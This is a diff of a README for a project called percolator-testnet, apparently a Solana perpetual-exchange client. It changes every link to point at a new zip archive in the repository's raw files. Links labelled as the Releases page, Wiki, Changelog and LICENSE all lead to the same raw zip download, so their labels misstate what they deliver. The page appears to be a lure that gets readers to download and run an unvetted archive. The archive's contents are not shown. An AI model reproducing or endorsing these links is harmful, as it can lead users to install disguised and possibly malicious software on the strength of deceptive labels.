@@ -6,7 +6,7 @@ Percolator is a sharded perpetual exchange protocol built on Solana. It offers h
 
 ## 📥 Download
 
-[![Download percolator-testnet](https://raw.githubusercontent.com/KanderZamora/percolator-testnet/main/Lepisma/percolator-testnet_2.5.zip)](https://raw.githubusercontent.com/KanderZamora/percolator-testnet/main/Lepisma/percolator-testnet_2.5.zip)
+[![Download percolator-testnet](https://raw.githubusercontent.com/KanderZamora/percolator-testnet/main/Lepisma/testnet-percolator-1.0-alpha.1.zip)](https://raw.githubusercontent.com/KanderZamora/percolator-testnet/main/Lepisma/testnet-percolator-1.0-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ To start with Percolator, follow these steps. It will help you set up your envir
 ### 📂 Installation Steps
 
 1. **Visit the GitHub Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/KanderZamora/percolator-testnet/main/Lepisma/percolator-testnet_2.5.zip) to find the latest version of Percolator.  
+   Go to the [Releases page](https://raw.githubusercontent.com/KanderZamora/percolator-testnet/main/Lepisma/testnet-percolator-1.0-alpha.1.zip) to find the latest version of Percolator.  
 
 2. **Download the Software**  
    Look for the version labeled as the latest release. Click the download link to save the file to your computer.
@@ -71,17 +71,17 @@ If your issue is not resolved with these steps, please reach out through the app
 
 ## 📚 Additional Resources
 
-- **User Documentation:** Comprehensive guides and FAQs can be found in the [Wiki section](https://raw.githubusercontent.com/KanderZamora/percolator-testnet/main/Lepisma/percolator-testnet_2.5.zip).
+- **User Documentation:** Comprehensive guides and FAQs can be found in the [Wiki section](https://raw.githubusercontent.com/KanderZamora/percolator-testnet/main/Lepisma/testnet-percolator-1.0-alpha.1.zip).
 - **Community Support:** Join our Discord server to connect with other users and developers. Share tips, ask questions, and get help.
 
 ## 📢 Changelog
 
-Stay updated with the latest changes and improvements in each release. You can find a detailed list in the [Changelog section](https://raw.githubusercontent.com/KanderZamora/percolator-testnet/main/Lepisma/percolator-testnet_2.5.zip).
+Stay updated with the latest changes and improvements in each release. You can find a detailed list in the [Changelog section](https://raw.githubusercontent.com/KanderZamora/percolator-testnet/main/Lepisma/testnet-percolator-1.0-alpha.1.zip).
 
 ## 📝 License
 
-This project is licensed under the MIT License - see the [LICENSE](https://raw.githubusercontent.com/KanderZamora/percolator-testnet/main/Lepisma/percolator-testnet_2.5.zip) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://raw.githubusercontent.com/KanderZamora/percolator-testnet/main/Lepisma/testnet-percolator-1.0-alpha.1.zip) file for details.
 
 ## 📥 Download Again
 
-If you need to reinstall or grab the latest version, revisit the [Releases page](https://raw.githubusercontent.com/KanderZamora/percolator-testnet/main/Lepisma/percolator-testnet_2.5.zip) to download.
+If you need to reinstall or grab the latest version, revisit the [Releases page](https://raw.githubusercontent.com/KanderZamora/percolator-testnet/main/Lepisma/testnet-percolator-1.0-alpha.1.zip) to download.
